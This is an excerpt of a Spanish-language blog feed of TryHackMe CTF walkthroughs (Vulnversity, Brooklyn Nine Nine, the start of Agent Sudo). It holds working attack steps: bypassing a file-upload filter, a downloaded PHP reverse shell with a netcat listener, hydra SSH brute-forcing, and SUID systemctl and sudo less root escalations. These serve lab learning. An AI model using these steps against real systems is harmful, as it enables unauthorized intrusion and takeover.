+000000550:   301        9 L      28 W       317 Ch      &amp;quot;css&amp;quot;                                                                                                                       
+000000953:   301        9 L      28 W       316 Ch      &amp;quot;js&amp;quot;                                                                                                                        
+000002771:   301        9 L      28 W       319 Ch      &amp;quot;fonts&amp;quot;                                                                                                                     
+000002984:   301        9 L      28 W       322 Ch      &amp;quot;internal&amp;quot;
+000095524:   403        11 L     32 W       302 Ch      &amp;quot;server-status&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: &lt;code&gt;internal&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;comprometer-el-servidor-web&#34;&gt;Comprometer el servidor web&lt;/h2&gt;
+&lt;h2 id=&#34;qué-tipo-de-archivo-común-que-le-gustaría-cargar-para-explotar-el-servidor-está-bloqueado-prueba-un-par-para-averiguarlo&#34;&gt;¿Qué tipo de archivo común, que le gustaría cargar para explotar el servidor, está bloqueado? Prueba un par para averiguarlo.&lt;/h2&gt;
+&lt;p&gt;La respuesta es &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;qué-extensión-está-permitida&#34;&gt;¿Qué extensión está permitida?&lt;/h3&gt;
+&lt;p&gt;Para identificar qué extensiones no están bloqueadas, vamos a fuzzear el formulario de carga. Para hacer esto, vamos a usar BurpSuite.&lt;/p&gt;
+&lt;p&gt;Primero vamos a capturar la petición, enviarlo al intruder y definir la extensión como una variable&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/burp.png&#34;
+	width=&#34;1234&#34;
+	height=&#34;283&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;436&#34;
+		data-flex-basis=&#34;1046px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;En el apartado de payloads vamos a definir las extensiones que queremos que pruebe&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/payloads.png&#34;
+	width=&#34;654&#34;
+	height=&#34;337&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;194&#34;
+		data-flex-basis=&#34;465px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora ya le podemos dar a attack.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/atack.png&#34;
+	width=&#34;785&#34;
+	height=&#34;200&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;392&#34;
+		data-flex-basis=&#34;942px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Si nos fijamos en la columna de length podemos ver que en todas sale lo mismo menos una. Eso significa que con él .phtml no nos ha devuelto el mismo mensaje, se puede suponer que lo ha aceptado&lt;/p&gt;
+&lt;h3 id=&#34;cuál-es-el-nombre-del-usuario-que-administra-el-servidor-web&#34;&gt;¿Cuál es el nombre del usuario que administra el servidor web?&lt;/h3&gt;
+&lt;p&gt;Viendo que podemos subir .phtml vamos a mandarle un archivo para crear una reverse shell, vamos a usar &lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php&lt;/a&gt; de pentestmonkey&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Nos lo pasamos a nuestra máquina
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+# Le cambiamos la extensión
+mv php-reverse-shell.php php-reverse-shell.phtml
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Importante cambiar estas líneas&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$ip = &#39;127.0.0.1&#39;;  // Ip de tú máquina
+$port = 1234;       // Puerto en el que te vas a poner en escucha
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos ponemos en escucha por el puerto 443 con netcat&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora ya podemos ejecutar el archivo poniendo lo siguiente en el navegador&lt;/p&gt;
+&lt;p&gt;http://10.10.23.174:3333/internal/uploads/php-reverse-shell.phtml&lt;/p&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora en /home/bill/user.txt ya podemos ver la flag y ya sabemos que el nombre de quien administra el servidor web es bill&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;En Linux, SUID (establecer el ID de usuario del propietario en la ejecución) es un tipo especial de permiso de archivo otorgado a un archivo. SUID otorga permisos temporales a un usuario para ejecutar el programa/archivo con el permiso del propietario del archivo (en lugar del usuario que lo ejecuta).&lt;/p&gt;
+&lt;p&gt;Por ejemplo, el archivo binario para cambiar su contraseña tiene el bit SUID (/usr/bin/passwd). Esto se debe a que para cambiar su contraseña, deberá escribir en el archivo shadowers al que no tiene acceso, root sí, por lo que tiene privilegios de root para realizar los cambios correctos.&lt;/p&gt;
+&lt;h3 id=&#34;en-el-sistema-busque-todos-los-archivos-suid-qué-archivo-se-destaca&#34;&gt;En el sistema, busque todos los archivos SUID. ¿Qué archivo se destaca?&lt;/h3&gt;
+&lt;p&gt;Con &lt;code&gt;find / -perm -4000 -exec ls -ldb {} \; 2&amp;gt;/dev/null&lt;/code&gt; podemos ver los archivos con permisos suid. La respuesta es /bin/systemctl&lt;/p&gt;
+&lt;h3 id=&#34;conviértase-en-root-y-obtenga-la-última-flag-rootroottxt&#34;&gt;Conviértase en root y obtenga la última flag (/root/root.txt)&lt;/h3&gt;
+&lt;p&gt;Ejecutando lo siguiente y después haciendo un cat a /tmp/output podemos ver la flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;TF=$(mktemp).service
+echo &#39;[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &amp;quot;cat /root/root.txt &amp;gt; /tmp/output&amp;quot;
+[Install]
+WantedBy=multi-user.target&#39; &amp;gt; $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /tmp/output
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Brooklyn Nine Nine</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-brooklyn-nine-nine/</link>
+        <pubDate>Sat, 17 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-brooklyn-nine-nine/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-brooklyn-nine-nine/images/1.jpg" alt="Featured image of post Resolución Brooklyn Nine Nine" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/brooklynninenine&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/brooklynninenine&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.243.15&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.243.15
+PING 10.10.243.15 (10.10.243.15) 56(84) bytes of data.
+64 bytes from 10.10.243.15: icmp_seq=1 ttl=63 time=96.3 ms
+
+--- 10.10.243.15 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 96.338/96.338/96.338/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.243.15 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.100.94
+   5   │     [*] Open ports: 21,22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p21,22,80 -sC -sV 10.10.243.15 -oN target
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.10.10
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 167fa2ffe0fba98777d6d3eb62572c6a3 (RSA)
+|   256 2e3b61594bc429ba5e858396f6fe99bee (ECDSA)
+|_  256 ab162e79203c9b0a019c8c4426015a804 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-p&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;puerto-21&#34;&gt;Puerto 21&lt;/h3&gt;
+&lt;p&gt;El nmap reporto que nos podemos conectar al puerto 21 como anonymous (&lt;code&gt;ftp-anon: Anonymous FTP login allowed&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;Dentro hay un archivo llamado &lt;code&gt;note_to_jake.txt&lt;/code&gt; que nos lo podemos pasar a nuestra máquina con &lt;code&gt;get note_to_jake.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;contenido-note_to_jaketxt&#34;&gt;Contenido note_to_jake.txt&lt;/h4&gt;
+&lt;p&gt;Dentro del archivo &lt;code&gt;note_to_jake.txt&lt;/code&gt; hay el siguiente mensaje&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;From Amy,&lt;/p&gt;
+&lt;p&gt;Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;De Amy,&lt;/p&gt;
+&lt;p&gt;Jake por favor cambia tu contraseña. Es demasiado débil y Holt se enojará si alguien piratea el nueve nueve.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Viendo este mensaje vemos que hay tres usuarios:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Amy&lt;/li&gt;
+&lt;li&gt;Holt&lt;/li&gt;
+&lt;li&gt;Jake&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;infiltración&#34;&gt;Infiltración&lt;/h1&gt;
+&lt;p&gt;Amy dice que la contraseña de Jake es demasiado débil, sabiendo esto podemos intentar con hyra hacer fuerza bruta al ssh como jake.&lt;/p&gt;
+&lt;p&gt;Hydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.92.221 ssh -t 40
+
+[22][ssh] host: 10.10.84.47   login: jake   password: ---------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora ya nos podemos conectar por ssh como jake&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh jake@10.10.84.47
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;tratamiento-de-tty&#34;&gt;Tratamiento de tty&lt;/h2&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;usertxt&#34;&gt;user.txt&lt;/h2&gt;
+&lt;p&gt;En el directorio &lt;code&gt;/home/jake&lt;/code&gt; y &lt;code&gt;/home/amy&lt;/code&gt; no hay nada, pero en el &lt;code&gt;/home/holt&lt;/code&gt; está el user.txt&lt;/p&gt;
+&lt;h1 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h1&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo -l
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;qué-es-less&#34;&gt;¿Qué es less?&lt;/h2&gt;
+&lt;p&gt;Less es un programa similar a more, pero que permite retroceder
+movimiento en el archivo, asi como el movimiento hacia adelante. además, menos
+no tiene que leer todo el archivo de entrada antes de comenzar, por lo que
+con archivos de entrada grandes, se inicia más rápido que los editores de texto como
+vi&lt;/p&gt;
+&lt;h2 id=&#34;como-escalar-con-less&#34;&gt;¿Como escalar con less?&lt;/h2&gt;
+&lt;p&gt;Si el binario puede ejecutarse como superusuario &lt;code&gt;sudo&lt;/code&gt;, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.&lt;/p&gt;
+&lt;p&gt;Lo primero es ejecutar less con sudo y especificarle un archivo que queremos leer, por ejemplo &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo less user.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Después si escribimos !/bin/bash y le damos a enter, ya somos root&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@brookly_nine_nine:/home/holt# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Agent sudo</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/</link>
+        <pubDate>Thu, 15 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/images/1.jpg" alt="Featured image of post Resolución Agent sudo" /&gt;&lt;p&gt;Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/agentsudoctf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/agentsudoctf&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.92.221&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.92.221
+PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data.
+64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms
+
+--- 10.10.92.221 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.221 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.92.221
+   5   │     [*] Open ports: 21,22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p21,22,80 -sC -sV 10.10.92.221 -oN target
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef1f5d04d4779506d6072ecf058f2cc07 (RSA)
+|   256 5e02d19ac4e7430662c19e25848aed7ea (ECDSA)
+|_  256 2d005cdb9fda8c8d880e3924f8b4f18e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Annoucement
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p21,22,80&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;puerto-80&#34;&gt;Puerto 80&lt;/h3&gt;
+&lt;p&gt;Hay una web con el siguiente texto en la página principal:&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Dear agents,&lt;/p&gt;
+&lt;p&gt;Use your own codename as user-agent to access the site.&lt;/p&gt;
+&lt;p&gt;From,
+Agent R&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;Estimados agentes,&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Utilice su propio nombre en clave como agente de usuario para acceder al sitio.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;De,&lt;/em&gt;
+&lt;em&gt;Agente R&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Según el texto podemos usar el &amp;ldquo;nombre en clave&amp;rdquo; como &amp;ldquo;user agent&amp;rdquo;. Vemos que está firmado como Agente R, se puede suponer que los agentes tienen una letra como nombre en clave. Con &lt;code&gt;curl -A &amp;quot;A&amp;quot; 10.10.92.221&lt;/code&gt; podemos ver la web como Agente A, pero ir probando así hasta la z se puede hacer eterno, para eso e echo un script en python que atomatiza el proceso de las peticiones y guarda las repuestas distintas.&lt;/p&gt;
+&lt;p&gt;User-Agent o también conocido como Agente de Usuario es una cabecera de texto que sirve para identificar al usuario que entra en una página web a través del navegador.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
+import requests, signal, time, pbd, sys, string, os
+
+main_url = &amp;quot;http://10.10.92.221&amp;quot;
+characters = string.ascii_uppercase
+standard = requests.get(main_url)
+different = &amp;quot;&amp;quot;
